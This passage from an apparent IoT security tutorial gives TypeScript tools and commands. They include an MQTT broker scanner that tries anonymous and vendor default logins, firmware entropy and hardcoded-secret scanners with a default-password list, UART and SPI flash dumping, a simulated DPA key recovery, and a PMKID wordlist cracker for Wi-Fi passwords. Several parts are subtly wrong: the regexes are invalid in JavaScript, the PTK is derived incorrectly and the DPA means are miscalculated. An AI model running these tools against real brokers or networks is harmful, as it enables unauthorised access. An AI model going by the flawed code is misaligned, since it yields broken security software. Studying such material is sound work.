        packet[offset++] = idBuf.length & 0xFF;
        idBuf.copy(packet, offset);
        offset += idBuf.length;

        // Username
        if (username) {
            const uBuf = Buffer.from(username, 'utf-8');
            packet[offset++] = (uBuf.length >> 8) & 0xFF;
            packet[offset++] = uBuf.length & 0xFF;
            uBuf.copy(packet, offset);
            offset += uBuf.length;
        }

        // Password
        if (password) {
            const pBuf = Buffer.from(password, 'utf-8');
            packet[offset++] = (pBuf.length >> 8) & 0xFF;
            packet[offset++] = pBuf.length & 0xFF;
            pBuf.copy(packet, offset);
            offset += pBuf.length;
        }

        // Set remaining length
        const remaining = offset - 1;
        packet[0] = 0x10; // keep CONNECT
        // Remaining length encoding (simplified — handles < 128 bytes)
        packet[1] = remaining;

        return packet.subarray(0, offset);
    }

    // MQTT SUBSCRIBE packet builder
    private buildSubscribePacket(packetId: number, topic: string): Buffer {
        const topicBuf = Buffer.from(topic, 'utf-8');
        const packet = Buffer.alloc(2 + 2 + 2 + topicBuf.length + 1);
        let offset = 0;
        packet[offset++] = 0x82; // SUBSCRIBE
        packet[offset++] = 2 + 2 + topicBuf.length + 1; // remaining length
        packet[offset++] = (packetId >> 8) & 0xFF;
        packet[offset++] = packetId & 0xFF;
        packet[offset++] = (topicBuf.length >> 8) & 0xFF;
        packet[offset++] = topicBuf.length & 0xFF;
        topicBuf.copy(packet, offset);
        offset += topicBuf.length;
        packet[offset++] = 0; // QoS 0
        return packet;
    }

    // Scan a broker for vulnerabilities
    scan(
        host: string,
        port: number = 1883,
        timeoutMs: number = 5000
    ): Promise<MqttSecurityReport> {
        return new Promise((resolve, reject) => {
            const report: MqttSecurityReport = {
                host,
                port,
                anonymousAccess: false,
                tlsEnabled: false,
                defaultCredentials: false,
                discoveredTopics: [],
                cleartextTopics: [],
                vulnerabilities: [],
                recommendation: '',
            };

            const socket = new net.Socket();
            let dataBuffer = Buffer.alloc(0);
            let authenticated = false;
            let pendingTopics = ['#', 'test', 'topic', 'device', 'sensor'];
            let currentTopicIndex = 0;

            socket.setTimeout(timeoutMs);

            socket.on('connect', () => {
                // Try anonymous connect first
                const connectPacket = this.buildConnectPacket(
                    `scanner_${Date.now()}`,
                    undefined,
                    undefined
                );
                socket.write(connectPacket);
            });

            socket.on('data', (data: Buffer) => {
                dataBuffer = Buffer.concat([dataBuffer, data]);

                // Check for CONNACK (0x20)
                if (dataBuffer.length >= 4 && dataBuffer[0] === 0x20) {
                    const returnCode = dataBuffer[3];
                    if (returnCode === 0x00) {
                        // Connected successfully with anonymous
                        report.anonymousAccess = true;
                        report.vulnerabilities.push(
                            'Broker allows anonymous connections (no credentials required)'
                        );
                        authenticated = true;

                        // Try subscribing to wildcard
                        const subPacket = this.buildSubscribePacket(1,
                            pendingTopics[currentTopicIndex]
                        );
                        socket.write(subPacket);
                    } else if (returnCode === 0x05) {
                        // Not authorized — try default credentials
                        this.tryDefaultCredentials(socket, report);
                    } else {
                        // Other error — close
                        socket.destroy();
                        this.finalizeReport(report);
                        resolve(report);
                    }
                }

                // Check for SUBACK (0x90)
                if (dataBuffer.length >= 5 && dataBuffer[0] === 0x90) {
                    const returnCode = dataBuffer[4];
                    if (returnCode === 0x00 || returnCode === 0x01) {
                        report.discoveredTopics.push(
                            `subscribable:${pendingTopics[currentTopicIndex]}`
                        );
                        currentTopicIndex++;
                        if (currentTopicIndex < pendingTopics.length) {
                            const subPacket = this.buildSubscribePacket(
                                currentTopicIndex + 1,
                                pendingTopics[currentTopicIndex]
                            );
                            socket.write(subPacket);
                        } else {
                            socket.destroy();
                            this.finalizeReport(report);
                            resolve(report);
                        }
                    }
                }
            });

            socket.on('timeout', () => {
                socket.destroy();
                this.finalizeReport(report);
                resolve(report);
            });

            socket.on('error', (err) => {
                reject(err);
            });

            socket.connect({ host, port });
        });
    }

    private tryDefaultCredentials(socket: net.Socket, report: MqttSecurityReport) {
        for (const creds of this.DEFAULT_CREDENTIALS) {
            const connectPacket = this.buildConnectPacket(
                `scanner_${Date.now()}`,
                creds.user,
                creds.pass
            );
            socket.write(connectPacket);
        }
    }

    private finalizeReport(report: MqttSecurityReport) {
        if (!report.tlsEnabled && report.port === 1883) {
            report.vulnerabilities.push('Cleartext MQTT (port 1883 without TLS)');
            report.recommendation =
                'Enable TLS on port 8883, disable anonymous access, ' +
                'enforce strong credentials, and configure topic ACLs.';
        } else if (report.anonymousAccess) {
            report.recommendation =
                'Disable anonymous access and require authentication.';
        } else {
            report.recommendation =
                'Configuration appears secure — continue monitoring.';
        }
    }
}

// Usage
async function auditBroker() {
    const scanner = new MqttSecurityScanner();
    try {
        const report = await scanner.scan('192.168.1.100', 1883);
        console.log('=== MQTT Security Report ===');
        console.log(`Host: ${report.host}:${report.port}`);
        console.log(`Anonymous: ${report.anonymousAccess}`);
        console.log(`Default Creds: ${report.defaultCredentials}`);
        console.log(`Vulnerabilities:`);
        report.vulnerabilities.forEach(v => console.log(`  - ${v}`));
        console.log(`Recommendation: ${report.recommendation}`);
    } catch (err) {
        console.error('Scan failed:', err);
    }
}
```

### 6.2 CoAP (Constrained Application Protocol)

CoAP (RFC 7252) is a RESTful protocol for constrained devices, running over UDP. It maps to HTTP concepts:
- GET, POST, PUT, DELETE methods
- URI paths like `/temperature`, `/actuator/lock`
- Response codes: 2.05 (Content), 4.00 (Bad Request), etc.

**CoAP Security Issues:**
- **NoDTLS (UDP equivalent of TLS) is optional** — many devices ship with NoSec mode
- **Amplification attacks** — CoAP over UDP enables DRDoS: a small request (e.g., 20 bytes) to a device that responds with a larger payload to a spoofed source IP
- **Resource discovery** — CoAP's `/.well-known/core` returns all available resources, exposing the full attack surface

### 6.3 Matter Protocol

Matter (formerly Project Connected Home over IP) is a unified smart home standard backed by Apple, Google, Amazon, and the Connectivity Standards Alliance. Key security features:

- **Device attestation** — each Matter device has a DAC (Device Attestation Certificate) signed by the CSA
- **Certificate-based authentication** — all commissioning uses PKI with X.509 certificates
- **Operational credentials** — per-device operational certificates after commissioning
- **Case (Certificate Authenticated Session Establishment)** and **PASE (Password Authenticated Session Establishment)** — secure session establishment

Despite strong design, Matter has implementation-level concerns:
- **Commissioning window left open** — the 5-minute commissioning window is often left open indefinitely in early firmware
- **DAC private key extraction** — if the DAC private key is not stored in a secure element, firmware extraction reveals it, allowing device impersonation
- **Thread network key leakage** — Thread (IPv6 mesh underlying Matter) uses a network key that, if extracted, compromises all Thread devices

### 6.4 Thread Networking

Thread is an IPv6-based mesh protocol for IoT, built on 6LoWPAN and IEEE 802.15.4:

```typescript
interface ThreadNetworkConfig {
    panId: number;        // 16-bit PAN ID
    extendedPanId: bigint; // 64-bit extended PAN ID
    channel: number;      // 11-26
    networkKey: Buffer;   // 16-byte AES-128 key
    networkName: string;
    pskc: Buffer;         // Pre-Shared Key for Commissioner
}

function analyzeThreadSecurity(config: ThreadNetworkConfig): string[] {
    const issues: string[] = [];

    // Check 1: Default network key?
    const defaultKeys = [
        Buffer.from('00112233445566778899AABBCCDDEEFF', 'hex'),
        Buffer.from('0102030405060708090A0B0C0D0E0F10', 'hex'),
    ];

    for (const dk of defaultKeys) {
        if (config.networkKey.equals(dk)) {
            issues.push('Default Thread network key detected — trivial to compromise');
        }
    }

    // Check 2: Network key entropy (should be uniformly random)
    const entropy = config.networkKey.reduce((sum, byte) => {
        const p = byte / 256;
        return sum - (p > 0 ? p * Math.log2(p) : 0);
    }, 0);

    if (entropy < 7.5) {
        issues.push(
            `Low network key entropy (${entropy.toFixed(2)} bits/byte). ` +
            `Expected ~8 bits/byte for random key.`
        );
    }

    // Check 3: PSKc (Pre-Shared Key for Commissioner)
    // Should be derived from commissioning credentials with PBKDF2
    if (config.pskc.length < 16) {
        issues.push('PSKc too short — should be 16 bytes (AES-128)');
    }

    return issues;
}

const threadConfig: ThreadNetworkConfig = {
    panId: 0x1234,
    extendedPanId: BigInt('0xDEADBEEFCAFEBABE'),
    channel: 15,
    networkKey: Buffer.from('00112233445566778899AABBCCDDEEFF', 'hex'),
    networkName: 'HomeThread',
    pskc: Buffer.from('1234567890ABCDEF1234567890ABCDEF', 'hex'),
};

console.log('Thread security issues:');
analyzeThreadSecurity(threadConfig).forEach(i => console.log(`  - ${i}`));
```

---

## 7. IoT Firmware Analysis

### 7.1 Firmware Extraction Workflow

```mermaid
flowchart TB
    A[Obtain Firmware] --> B{Source}
    B -->|Vendor Website| C[Download .bin / .img]
    B -->|Physical Device| D[Dump via UART/JTAG/SPI Flash]
    C --> E[Identify Format]
    D --> E
    E -->|binwalk| F[Extract Filesystem]
    E -->|strings| G[Find Hardcoded Strings]
    E -->|Entropy Analysis| H{High Entropy?}
    H -->|Yes| I[Encrypted / Compressed]
    H -->|No| J[Plaintext filesystem]
    I --> K[Identify Algorithm]
    I --> L[Brute-force LZMA/GZip]
    J --> M[Crawl Filesystem]
    F --> M
    M --> N[Analyze Binaries]
    M --> O[Check Configs]
    M --> P[SSL/TLS certs]
    N --> Q[Harden / Patch]
    O --> Q
    P --> Q
```

### 7.2 Binwalk

Binwalk is the primary tool for firmware analysis. It scans firmware images for embedded files and filesystems.

```bash
# Basic scan — identify embedded files
binwalk firmware.bin

# Extract all discovered filesystems
binwalk -e firmware.bin

# With entropy analysis (entropy graph)
binwalk -E firmware.bin

# Deep scan with matryoshka (nested extraction)
binwalk -Me firmware.bin

# Specific signature scan
binwalk -Y firmware.bin

# Manual extraction of specific offset
dd if=firmware.bin of=uboot.bin skip=256 count=1024 bs=1
```

**Typical Binwalk Output:**
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             u-boot legacy image, Linux,...
131072        0x20000         LZMA compressed data, properties: 0x5D,...
262144        0x40000         Squashfs filesystem, little endian, version 4.0
```

### 7.3 Entropy Analysis

Firmware entropy analysis determines whether sections are encrypted or compressed by measuring the randomness of byte sequences:

- **Low entropy (~4.0–5.5 bits/byte)** — plaintext, uncompressed code/data
- **Medium entropy (~6.5–7.5 bits/byte)** — likely compressed (LZMA, GZip, zlib)
- **High entropy (~7.5–8.0 bits/byte)** — likely encrypted or already compressed

```typescript
// Firmware Entropy Analyzer — identifies compression/encryption boundaries
import * as fs from 'fs';
import * as zlib from 'zlib';

interface EntropyBlock {
    offset: number;
    entropy: number;
    blockSize: number;
    classification: 'plaintext' | 'compressed' | 'encrypted' | 'unknown';
}

class FirmwareEntropyAnalyzer {
    private readonly BLOCK_SIZE = 256; // Analyze in 256-byte chunks

    // Shannon entropy calculation for a byte buffer
    calculateEntropy(data: Buffer): number {
        const freq: Map<number, number> = new Map();
        for (const byte of data) {
            freq.set(byte, (freq.get(byte) || 0) + 1);
        }

        let entropy = 0;
        const len = data.length;
        for (const count of freq.values()) {
            if (count === 0) continue;
            const p = count / len;
            entropy -= p * Math.log2(p);
        }

        return entropy;
    }

    // Analyze firmware image in sliding blocks
    analyze(firmwarePath: string): EntropyBlock[] {
        const firmware = fs.readFileSync(firmwarePath);
        const blocks: EntropyBlock[] = [];
        const totalSize = firmware.length;

        for (let offset = 0; offset < totalSize; offset += this.BLOCK_SIZE) {
            const end = Math.min(offset + this.BLOCK_SIZE, totalSize);
            const chunk = firmware.subarray(offset, end);
            const entropy = this.calculateEntropy(chunk);
            const block: EntropyBlock = {
                offset,
                entropy: Math.round(entropy * 100) / 100,
                blockSize: end - offset,
                classification: this.classifyEntropy(entropy),
            };
            blocks.push(block);
        }

        return blocks;
    }

    private classifyEntropy(entropy: number): EntropyBlock['classification'] {
        if (entropy < 5.5) return 'plaintext';
        if (entropy < 7.0) return 'compressed';
        if (entropy >= 7.5) return 'encrypted';
        return 'unknown';
    }

    // Generate entropy analysis report
    generateReport(blocks: EntropyBlock[]): string {
        const lines: string[] = [];
        lines.push('Offset (hex) | Entropy   | Classification');
        lines.push('-------------|-----------|---------------');

        for (const block of blocks) {
            const hexOffset = `0x${block.offset.toString(16).padStart(8, '0')}`;
            const entropyStr = block.entropy.toFixed(2).padStart(8);
            lines.push(
                `${hexOffset} | ${entropyStr} | ${block.classification}`
            );
        }

        // Summary statistics
        const total = blocks.length;
        const plaintextCount = blocks.filter(
            b => b.classification === 'plaintext'
        ).length;
        const compressedCount = blocks.filter(
            b => b.classification === 'compressed'
        ).length;
        const encryptedCount = blocks.filter(
            b => b.classification === 'encrypted'
        ).length;

        lines.push('');
        lines.push('=== Entropy Summary ===');
        lines.push(`Total blocks analyzed: ${total}`);
        lines.push(`Plaintext blocks:      ${plaintextCount} (${(plaintextCount / total * 100).toFixed(1)}%)`);
        lines.push(`Compressed blocks:     ${compressedCount} (${(compressedCount / total * 100).toFixed(1)}%)`);
        lines.push(`Encrypted blocks:      ${encryptedCount} (${(encryptedCount / total * 100).toFixed(1)}%)`);

        return lines.join('\n');
    }

    // Try to decompress suspected compressed regions
    tryDecompressBlocks(
        firmwarePath: string,
        blocks: EntropyBlock[]
    ): Buffer[] {
        const firmware = fs.readFileSync(firmwarePath);
        const decompressed: Buffer[] = [];

        for (const block of blocks) {
            if (block.classification !== 'compressed') continue;

            const chunk = firmware.subarray(
                block.offset,
                block.offset + block.blockSize
            );

            try {
                // Try gzip decompression
                const result = zlib.gunzipSync(chunk);
                decompressed.push(result);
                console.log(
                    `Decompressed ${block.offset} -> ${result.length} bytes (gzip)`
                );
            } catch {
                try {
                    const result = zlib.inflateSync(chunk);
                    decompressed.push(result);
                    console.log(
                        `Decompressed ${block.offset} -> ${result.length} bytes (deflate)`
                    );
                } catch {
                    // Not standard zlib/gzip — possibly LZMA or custom
                }
            }
        }

        return decompressed;
    }
}

// Usage
const analyzer = new FirmwareEntropyAnalyzer();
const blocks = analyzer.analyze('firmware.bin');
console.log(analyzer.generateReport(blocks));
const decompressed = analyzer.tryDecompressBlocks('firmware.bin', blocks);
console.log(`\nDecompressed ${decompressed.length} blocks successfully.`);
```

### 7.4 Hardcoded Credential Detection

One of the most common IoT firmware findings is hardcoded credentials, often embedded as strings in the binary.

```typescript
// Hardcoded credential scanner
interface CredentialFinding {
    type: 'password' | 'username' | 'token' | 'api_key' | 'private_key';
    value: string;
    offset: number;
    context: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
}

class FirmwareCredentialScanner {
    // Known insecure patterns from IoT firmware
    private readonly DANGEROUS_PATTERNS = [
        { pattern: /(?i)(admin|root|user).*[:=].*(admin|root|1234|password)/,
          type: 'password' as const, severity: 'critical' as const },
        { pattern: /(?i)(passwd|password|pass)\s*[:=]\s*['"][^'"]{4,}['"]/,
          type: 'password' as const, severity: 'high' as const },
        { pattern: /(?i)(api_key|apikey|api_secret)\s*[:=]\s*['"][^'"]{8,}['"]/,
          type: 'api_key' as const, severity: 'critical' as const },
        { pattern: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/,
          type: 'private_key' as const, severity: 'critical' as const },
        { pattern: /(?i)(token|jwt|bearer)\s*[:=]\s*['"][A-Za-z0-9_\-.]{20,}['"]/,
          type: 'token' as const, severity: 'high' as const },
        { pattern: /(?i)(telnet|ssh|ftp)_?(pass|password|passwd)\s*[:=]\s*['"][^'"]+['"]/,
          type: 'password' as const, severity: 'critical' as const },
    ];

    // Known backdoor/default credentials from real IoT devices
    private readonly KNOWN_BACKDOORS: Array<{
        vendor: string;
        username: string;
        password: string;
    }> = [
        { vendor: 'Ubiquiti', username: 'ubnt', password: 'ubnt' },
        { vendor: 'Grandstream', username: 'admin', password: 'admin' },
        { vendor: 'Grandstream', username: 'admin', password: 'gsca17' },
        { vendor: 'D-Link', username: 'admin', password: 'admin' },
        { vendor: 'Hikvision', username: 'admin', password: '12345' },
        { vendor: 'TP-Link', username: 'admin', password: 'admin' },
        { vendor: 'ZTE', username: 'admin', password: 'zte' },
        { vendor: 'Cisco Small Business', username: 'cisco', password: 'cisco' },
        { vendor: 'Axis', username: 'root', password: 'pass' },
        { vendor: 'Samsung Cameras', username: 'admin', password: '1111111' },
    ];

    scan(firmware: Buffer): CredentialFinding[] {
        const findings: CredentialFinding[] = [];
        const strData = firmware.toString('utf-8');

        // Pattern-based scan
        for (const { pattern, type, severity } of this.DANGEROUS_PATTERNS) {
            const matches = strData.matchAll(pattern);
            for (const match of matches) {
                const offset = match.index!;
                const value = match[0].substring(0, 80); // truncate for display
                const ctxStart = Math.max(0, offset - 40);
                const ctxEnd = Math.min(strData.length, offset + match[0].length + 40);
                const context = strData.substring(ctxStart, ctxEnd)
                    .replace(/[\r\n]/g, ' ');

                findings.push({
                    type,
                    value,
                    offset,
                    context,
                    severity,
                });
            }
        }

        // Known backdoor scan
        for (const backdoor of this.KNOWN_BACKDOORS) {
            const combinedPats = [
                backdoor.username, backdoor.password,
                Buffer.from(backdoor.username).toString('hex'),
                Buffer.from(backdoor.password).toString('hex'),
            ];

            for (const pat of combinedPats) {
                let idx = 0;
                while ((idx = strData.indexOf(pat, idx)) !== -1) {
                    const ctxStart = Math.max(0, idx - 30);
                    const ctxEnd = Math.min(strData.length, idx + pat.length + 30);
                    findings.push({
                        type: 'password',
                        value: `[${backdoor.vendor}] ${backdoor.username}:${backdoor.password}`,
                        offset: idx,
                        context: strData.substring(ctxStart, ctxEnd).replace(/[\r\n]/g, ' '),
                        severity: 'critical',
                    });
                    idx += pat.length;
                }
            }
        }

        return findings;
    }
}

const scanner = new FirmwareCredentialScanner();
const sampleFirmware = Buffer.from(`
    // config section
    #define ADMIN_PASSWORD "12345"
    #define API_KEY "sk_live_PLACEHOLDER_API_KEY_REMOVED"
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA...
    -----END RSA PRIVATE KEY-----
    telnet_pass = "root"
`);

const findings = scanner.scan(sampleFirmware);
console.log('=== Credential Scan Results ===');
findings.forEach(f => {
    console.log(`[${f.severity.toUpperCase()}] ${f.type} at offset 0x${f.offset.toString(16)}`);
    console.log(`  Value: ${f.value.substring(0, 60)}...`);
    console.log(`  Context: ${f.context}`);
});
```

### 7.5 Backdoor Detection

Common IoT backdoor patterns include:
- **Bind shells** — listening on a TCP/UDP port for shell access
- **Reverse shells** — connecting outbound to a C2 server
- **Magic packets** — specific UDP payload triggers telnet daemon
- **Hardcoded debug endpoints** — `/debug`, `/shell`, `/exec` in embedded web servers
- **Test accounts** — accounts that bypass normal authentication

---

## 8. Embedded Hardware Security

### 8.1 Debug Interfaces

| Interface | Pins | Voltage | Speed | Use Case |
|---|---|---|---|---|
| **UART** | TX, RX, GND (optional VCC) | 1.8V–5V | 9600–921600 baud | Serial console, boot logs |
| **SPI** | SCK, MOSI, MISO, CS | 1.8V–5V | Up to 80 MHz | Flash memory, sensors |
| **I2C** | SCL, SDA | 1.8V–5V | 100 kHz–3.4 MHz | Configuration, sensors |
| **JTAG** | TMS, TCK, TDI, TDO, nTRST | 1.8V–5V | Up to 100 MHz | Debug, programming, boundary scan |
| **SWD** | SWDIO, SWCLK | 1.8V–5V | Up to 50 MHz | ARM Serial Wire Debug |

**UART Probing Workflow:**

1. Visually identify test points (often 4-pin headers near the SoC)
2. Use a multimeter in continuity mode to find GND
3. Probe remaining pins with a logic analyzer or oscilloscope:
   - TX will show ~3.3V idle and UART frames during boot (periodic square wave)
4. Connect a USB-UART adapter (e.g., FTDI, CP2102) to TX/RX/GND
5. Try common baud rates: 115200, 57600, 38400, 19200, 9600
6. Use `minicom` or `screen` to access the console

```bash
# Linux UART access
sudo screen /dev/ttyUSB0 115200

# Auto-baud detection
python3 -c "
import serial, time
s = serial.Serial('/dev/ttyUSB0', timeout=1)
for rate in [115200, 57600, 38400, 19200, 9600]:
    s.baudrate = rate
    s.write(b'\r\n')
    time.sleep(0.1)
    data = s.read(100)
    if b'login' in data.lower() or b'#' in data:
        print(f'Found baud: {rate}')
        break
"
```

### 8.2 Flash Dumping

Embedded devices typically use SPI NOR flash or NAND flash for firmware storage.

```bash
# Using flashrom (supports thousands of SPI flash chips)
sudo flashrom -p ch341a_spi -r firmware_dump.bin

# Using a Bus Pirate with spi-bin
./spi-bin -d /dev/ttyUSB0 -r firmware_dump.bin -s 8388608  # 8MB read

# Verify dump integrity
sha256sum firmware_dump.bin
```

**Protecting against flash dumping:**
- **Read-out protection (RDP)** on STM32 and other MCUs
- **eFuse blowing** to disable debug interfaces
- **Glue logic** to encrypt flash contents
- **Secure enclaves** (TrustZone, SE)

### 8.3 Side-Channel Attacks

#### Power Analysis (SPA/DPA)

Simple Power Analysis (SPA) identifies operations by their power consumption trace. Differential Power Analysis (DPA) statistically correlates power consumption with specific intermediate values in cryptographic operations.

```typescript
// Simulated power analysis trace for AES encryption
// Demonstrates how the first round key leaks via power

interface PowerTrace {
    samples: number[];
    plaintext: number[];
    keyByte: number;
}

function simulateAesFirstRoundPowerTrace(
    plaintextByte: number,
    keyByte: number
): number[] {
    // Simulate 100 clock cycles of an AES S-box lookup
    const trace: number[] = [];
    const sboxOutput = aesSbox(plaintextByte ^ keyByte);

    for (let cycle = 0; cycle < 100; cycle++) {
        // Hamming weight of S-box output correlates with power consumption
        const hw = popcount(sboxOutput);
        // Add noise
        const noise = Math.floor(Math.random() * 5) - 2;
        const power = hw * 3 + noise + 50; // baseline of 50mW
        trace.push(power);
    }

    return trace;
}

function aesSbox(value: number): number {
    // Standard AES S-Box (simplified — actual is a 256-byte lookup table)
    const sbox = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ];
    return sbox[value & 0xFF];
}

function popcount(x: number): number {
    x = x - ((x >>> 1) & 0x55555555);
    x = (x & 0x33333333) + ((x >>> 2) & 0x33333333);
    x = (x + (x >>> 4)) & 0x0F0F0F0F;
    return (x * 0x01010101) >>> 24;
}

// DPA attack simulation: correlate traces with guessed key bytes
function dpaAttack(traces: PowerTrace[]): number {
    const bestGuesses: Map<number, number> = new Map();

    for (let keyGuess = 0; keyGuess < 256; keyGuess++) {
        const correlation = dpaCorrelation(traces, keyGuess);
        bestGuesses.set(keyGuess, correlation);
    }

    // Return the key byte with highest correlation
    let bestKey = 0;
    let bestCorr = -Infinity;
    for (const [key, corr] of bestGuesses) {
        if (corr > bestCorr) {
            bestCorr = corr;
            bestKey = key;
        }
    }

    return bestKey;
}

function dpaCorrelation(traces: PowerTrace[], keyGuess: number): number {
    // Simplified DPA: split traces into two sets based on S-box output bit
    const set0: number[][] = [];
    const set1: number[][] = [];

    for (const trace of traces) {
        const sboxOut = aesSbox(trace.plaintext[0] ^ keyGuess);
        if ((sboxOut & 0x01) === 0) {
            set0.push(trace.samples);
        } else {
            set1.push(trace.samples);
        }
    }

    // Compute difference of means (DOM)
    if (set0.length === 0 || set1.length === 0) return 0;

    const mean0 = set0[0].reduce((a, b) => a + b, 0) / set0.length;
    const mean1 = set1[0].reduce((a, b) => a + b, 0) / set1.length;

    return Math.abs(mean0 - mean1);
}

// Generate 1000 simulated power traces
const traces: PowerTrace[] = [];
for (let i = 0; i < 1000; i++) {
    const pt = Math.floor(Math.random() * 256);
    traces.push({
        samples: simulateAesFirstRoundPowerTrace(pt, 0x3A), // real key byte = 0x3A
        plaintext: [pt],
        keyByte: 0x3A,
    });
}

// The DPA attack should reveal key byte 0x3A
const recoveredKey = dpaAttack(traces);
console.log(`Recovered key byte: 0x${recoveredKey.toString(16).padStart(2, '0')}`);
console.log(`Expected key byte:  0x3a`);
console.log(`Attack ${recoveredKey === 0x3a ? 'SUCCEEDED' : 'FAILED'} — key correctly recovered`);
```

#### Glitching (Voltage / Clock / EM)

Glitching injects transient faults into a processor by briefly disrupting its power supply (VCC glitch), clock signal (clock glitch), or electromagnetic field (EM glitch). Applications:

- **Bypassing secure boot** — skip signature verification check
- **Bypassing password prompts** — corrupt the branch condition in the authentication routine
- **Extracting ROM contents** — glitch the ROM read protection

Typical voltage glitching setup:
- **ChipWhisperer** (NewAE) — all-in-one glitch/analysis platform
- **Raspberry Pi Pico + MOSFET** — DIY voltage glitcher
- **Falcon Four** (Ph.D. glitcher)

---

## 9. TypeScript Implementations

### 9.1 PMKID Calculation and Verification Tool

```typescript
import * as crypto from 'crypto';
import * as readline from 'readline';

interface WifiHandshake {
    ssid: string;
    bssid: string;   // AP MAC
    clientMac: string; // STA MAC
    anonce: string;   // hex
    snonce: string;   // hex
    mic: string;      // hex
    pmkid?: string;   // hex (optional, from first EAPOL frame)
}

class PmkidCracker {
    private readonly ITERATIONS = 4096;
    private readonly KEY_LENGTH = 32;

    derivePmk(ssid: string, password: string): Buffer {
        return crypto.pbkdf2Sync(
            password,
            ssid,
            this.ITERATIONS,
            this.KEY_LENGTH,
            'sha1'
        );
    }

    computePmkid(pmk: Buffer, apMac: Buffer, staMac: Buffer): string {
        const label = Buffer.from('PMK Name', 'utf-8');
        const data = Buffer.concat([label, apMac, staMac]);
        const hmac = crypto.createHmac('sha1', pmk).update(data).digest();
        return hmac.subarray(0, 16).toString('hex');
    }

    computePtk(pmk: Buffer, anonce: Buffer, snonce: Buffer,
               apMac: Buffer, staMac: Buffer): Buffer {
        // PTK = PRF-X(PMK, "Pairwise key expansion", Min(AP_MAC,STA_MAC)
        //        || Max(AP_MAC,STA_MAC) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
        const minMac = Buffer.compare(apMac, staMac) < 0 ? apMac : staMac;
        const maxMac = Buffer.compare(apMac, staMac) < 0 ? staMac : apMac;
        const minNonce = Buffer.compare(anonce, snonce) < 0 ? anonce : snonce;
        const maxNonce = Buffer.compare(anonce, snonce) < 0 ? snonce : anonce;

        const prefix = Buffer.from('Pairwise key expansion', 'utf-8');
        const data = Buffer.concat([minMac, maxMac, minNonce, maxNonce]);
        const input = Buffer.concat([prefix, Buffer.from([0x00]), data]);

        // PTK is 384 bits (48 bytes) for CCMP:
        // KCK (16) + KEK (16) + TK (16)
        return crypto.pbkdf2Sync(input, pmk, 1, 48, 'sha1');
    }

    verifyMic(ptk: Buffer, eapolFrame: Buffer): boolean {
        // MIC is the first 16 bytes of KCK-based HMAC
        const kck = ptk.subarray(0, 16);
        // EAPOL frame with MIC field zeroed out
        const micComputed = crypto.createHmac('sha1', kck)
            .update(eapolFrame)
            .digest();
        // MIC is the first 16 bytes of the HMAC-SHA1 output
        const expectedMic = eapolFrame.subarray(
            eapolFrame.length - 16
        );
        return micComputed.subarray(0, 16).equals(expectedMic);
    }

    crackFromWordlist(
        handshake: WifiHandshake,
        wordlist: string[]
    ): string | null {
        const apMac = Buffer.from(handshake.bssid.replace(/:/g, ''), 'hex');
        const staMac = Buffer.from(handshake.clientMac.replace(/:/g, ''), 'hex');

        for (const word of wordlist) {
            const pmk = this.derivePmk(handshake.ssid, word);

            if (handshake.pmkid) {
                // PMKID attack — faster, no client needed
                const computed = this.computePmkid(pmk, apMac, staMac);
                if (computed === handshake.pmkid) {
                    return word;
                }
            } else {
                // Full 4-way handshake verification
                const ptk = this.computePtk(
                    pmk,
                    Buffer.from(handshake.anonce, 'hex'),
                    Buffer.from(handshake.snonce, 'hex'),
                    apMac,
                    staMac
                );
                // Verify MIC (simplified — real implementation needs full EAPOL frame)
                // This would require the complete captured frame
            }
        }

        return null;
    }
}

// CLI tool
async function mainPmkidCli() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    const getInput = (query: string): Promise<string> =>
        new Promise(resolve => rl.question(query, resolve));

    const ssid = await getInput('SSID: ');
    const password = await getInput('Password to verify: ');
    const bssid = await getInput('AP MAC (xx:xx:xx:xx:xx:xx): ');
    const staMac = await getInput('Client MAC (xx:xx:xx:xx:xx:xx): ');
